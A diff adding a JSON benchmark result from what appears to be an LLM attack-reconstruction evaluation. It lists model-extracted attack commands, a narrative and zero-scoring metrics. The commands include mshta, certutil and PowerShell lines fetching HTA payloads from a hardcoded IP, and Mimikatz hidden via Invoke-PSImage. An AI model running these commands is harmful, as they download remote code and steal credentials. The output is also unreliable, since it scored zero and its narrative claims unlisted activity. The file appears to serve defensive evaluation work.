@@ -1,0 +1,139 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/test.hta -Method POST -UseBasicParsing -ContentType application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powercfg -imps",
+        "stage": "Discovery"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wermgr.exe -upload",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wmic process list",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wermgr.exe -upload",
+        "stage": "Collection"
+      },
+      {
+        "command": "wermgr.exe -upload",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "wermgr.exe -upload",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attack likely starts as an initial access phase when the victim executes a PowerShell script containing the `Invoke-WebRequest` command to download an HTML file (`test.hta`) from a C2 server located at IP address `124.223.85.207`. The payload downloaded appears to be a malicious HTA file that uses VBScript to conduct lateral movement by creating new processes under different user contexts. This behavior indicates that the attackers aim to establish persistence within the target network. Furthermore, the use of registry modifications via the `reg` command suggests an attempt to evade detection through changes made to the system. Additionally, Mimikatz and PowerSploit tools have been executed using PowerShell scripts, indicating credential targeting and exfiltration activities. These findings suggest that the attack employed multiple tactics over several phases to achieve their goals.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44417,
+      "completion_tokens": 965,
+      "total_tokens": 45382,
+      "wall_clock_s": 20.601,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 22,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 22,
+      "fn": 23,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.07142857142857142,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44417,
+      "completion_tokens": 965,
+      "total_tokens": 45382,
+      "wall_clock_s": 20.601,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
